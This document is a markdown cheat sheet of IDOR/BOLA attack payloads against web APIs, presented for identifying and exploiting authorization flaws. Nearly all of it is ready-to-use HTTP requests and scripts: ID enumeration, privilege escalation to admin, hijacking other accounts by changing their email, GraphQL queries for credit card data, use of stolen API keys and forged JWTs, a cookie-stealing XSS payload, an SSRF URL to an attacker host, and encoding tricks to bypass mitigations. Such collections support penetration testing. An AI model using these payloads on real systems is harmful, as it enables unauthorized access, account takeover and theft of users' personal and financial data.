# Complete IDOR/BOLA (Insecure Direct Object Reference / Broken Object Level Authorization) Payloads

This document contains a comprehensive collection of IDOR/BOLA testing payloads and techniques for identifying and exploiting insecure direct object reference vulnerabilities.

## Table of Contents
1. [Basic IDOR Testing](#basic-idor-testing)
2. [Horizontal Escalation](#horizontal-escalation)
3. [Vertical Escalation](#vertical-escalation)
4. [Parameter Manipulation](#parameter-manipulation)
5. [HTTP Method Manipulation](#http-method-manipulation)
6. [Batch Requests](#batch-requests)
7. [GraphQL IDOR](#graphql-idor)
8. [API BOLA](#api-bola)
9. [Advanced Exploitation](#advanced-exploitation)
10. [Mitigation Bypass](#mitigation-bypass)

---

## Basic IDOR Testing

### Numeric ID Incrementation
```http
GET /api/user/1234 HTTP/1.1
Host: target.com
```

### UUID Manipulation
```http
GET /api/document/65e8baf0-efd3-4a9e-8f0a-12a3b456cd78 HTTP/1.1
Host: target.com
```

### Sequential ID Testing
```bash
# Bash script to test sequential IDs
for id in {1000..1010}; do
  curl -s "https://target.com/api/user/$id" | grep -q "Not Found" || echo "Found valid ID: $id"
done
```

---

## Horizontal Escalation

### User Profile Access
```http
GET /api/profile?user_id=5678 HTTP/1.1
Host: target.com
Authorization: Bearer <your_token>
```

### Order Details Access
```http
GET /api/orders/7890 HTTP/1.1
Host: target.com
Cookie: session=<your_session>
```

### File Download
```http
GET /download?file=user123_private.txt HTTP/1.1
Host: target.com
```

---

## Vertical Escalation

### Admin Endpoint Access
```http
GET /admin/deleteUser?user_id=1234 HTTP/1.1
Host: target.com
Authorization: Bearer <non_admin_token>
```

### Privileged API Access
```http
POST /api/admin/createUser HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <user_token>

{"username":"attacker","role":"admin"}
```

---

## Parameter Manipulation

### JSON Parameter
```http
POST /api/updateProfile HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <your_token>

{"user_id":"5678","email":"attacker@evil.com"}
```

### Form Data Parameter
```http
POST /updateProfile HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=<your_session>

user_id=5678&email=attacker@evil.com
```

### URL Parameter
```http
GET /api/user?user_id=5678&action=delete HTTP/1.1
Host: target.com
```

---

## HTTP Method Manipulation

### GET to POST
```http
POST /api/user/1234 HTTP/1.1
Host: target.com
```

### POST to PUT
```http
PUT /api/user/1234 HTTP/1.1
Host: target.com
```

### HEAD Request
```http
HEAD /api/user/1234 HTTP/1.1
Host: target.com
```

---

## Batch Requests

### Batch ID Testing
```http
POST /api/batch HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "requests": [
    {"method": "GET", "path": "/user/1234"},
    {"method": "GET", "path": "/user/5678"},
    {"method": "GET", "path": "/user/9012"}
  ]
}
```

### Batch Operations
```http
POST /api/batchUpdate HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "updates": [
    {"user_id": "1234", "email": "attacker1@evil.com"},
    {"user_id": "5678", "email": "attacker2@evil.com"}
  ]
}
```

---

## GraphQL IDOR

### Query Manipulation
```graphql
query {
  user(id: "5678") {
    id
    email
    creditCard {
      number
      expiry
    }
  }
}
```

### Mutation Manipulation
```graphql
mutation {
  updateUser(id: "5678", input: {
    email: "attacker@evil.com"
    isAdmin: true
  }) {
    id
    email
    isAdmin
  }
}
```

---

## API BOLA

### JWT Claims Manipulation
```http
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer <modified_JWT_with_admin_claim>
```

### API Key Testing
```http
GET /api/v1/transactions?account_id=98765 HTTP/1.1
Host: target.com
X-API-Key: <stolen_or_weak_api_key>
```

---

## Advanced Exploitation

### Blind IDOR
```http
GET /api/user/1234/status HTTP/1.1
Host: target.com

# Compare response times or subtle differences
```

### IDOR to XSS
```http
POST /api/updateProfile HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "user_id": "5678",
  "bio": "<script>alert(document.cookie)</script>"
}
```

### IDOR to SSRF
```http
POST /api/updateAvatar HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "user_id": "5678",
  "avatar_url": "http://attacker.com/steal.php"
}
```

---

## Mitigation Bypass

### URL Encoding
```http
GET /api/user/%32%31%33%34 HTTP/1.1  # 2134
Host: target.com
```

### JSON Wrap
```http
POST /api/getUser HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "user": {
    "id": "5678"
  }
}
```

### Array Parameter
```http
GET /api/user?id[]=1234&id[]=5678 HTTP/1.1
Host: target.com
```

### Special Characters
```http
GET /api/user/1234' HTTP/1.1
Host: target.com
```

